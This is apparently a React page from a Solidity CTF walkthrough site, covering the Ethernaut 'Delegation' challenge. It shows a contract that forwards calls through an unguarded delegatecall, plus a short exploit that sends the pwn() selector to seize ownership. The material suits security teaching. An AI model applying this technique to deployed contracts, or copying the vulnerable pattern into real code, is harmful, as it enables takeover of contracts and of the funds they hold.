import { useState } from "react";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { atomOneDark } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { AiFillCopy, AiOutlineFileDone } from "react-icons/ai";
import TextDiv from "../../components/TextDiv";

const Delegation = () => {
  const [copy, setCopy] = useState(false);
  const codeString = `
  // SPDX-License-Identifier: MIT
  pragma solidity ^0.8.0;
  
  contract Delegate {
  
    address public owner;
  
    constructor(address _owner) {
      owner = _owner;
    }
  
    function pwn() public {
      owner = msg.sender;
    }
  }
  
  contract Delegation {
  
    address public owner;
    Delegate delegate;
  
    constructor(address _delegateAddress) {
      delegate = Delegate(_delegateAddress);
      owner = msg.sender;
    }
  
    fallback() external {
      (bool result,) = address(delegate).delegatecall(msg.data);
      if (result) {
        this;
      }
    }
  }`;

  const solutionCode = `
  signature = web3.eth.abi.encodeFunctionSignature("pwn()")

  await contract.sendTransaction({ from: player, data: signature })
`;

  return (
    <div>
      <h1 className="headerText">Delegation</h1>
      <div className="content">
        <div className="highlighterHeader">
          <p className="smallText"> Example code</p>
          {copy ? (
            <button className="copyButton">
              <span>
                <AiOutlineFileDone />
              </span>
              Copied!
            </button>
          ) : (
            <button
              className="copyButton"
              onClick={() => {
                navigator.clipboard.writeText(codeString);
                setCopy(true);
                setTimeout(() => {
                  setCopy(false);
                }, 3000);
              }}
            >
              <span>
                <AiFillCopy />
              </span>
              Copy Code
            </button>
          )}
        </div>
        <SyntaxHighlighter
          language="solidity"
          style={atomOneDark}
          customStyle={{
            padding: "25px",
            borderRadius: "0.375rem",
          }}
          wrapLongLines={true}
        >
          {codeString}
        </SyntaxHighlighter>
      </div>
      <div className="textBox">
        <TextDiv
          title="Hack"
          text="We just have to send function signature of pwn method of Delegate as msg.data to fallback so that code of Delegate is executed in the context of Delegation. That changes the ownership of Delegation."
        />
      </div>
      <SyntaxHighlighter
        language="solidity"
        style={atomOneDark}
        customStyle={{
          padding: "25px",
          borderRadius: "0.375rem",
        }}
        wrapLongLines={true}
      >
        {solutionCode}
      </SyntaxHighlighter>
    </div>
  );
};

export default Delegation;
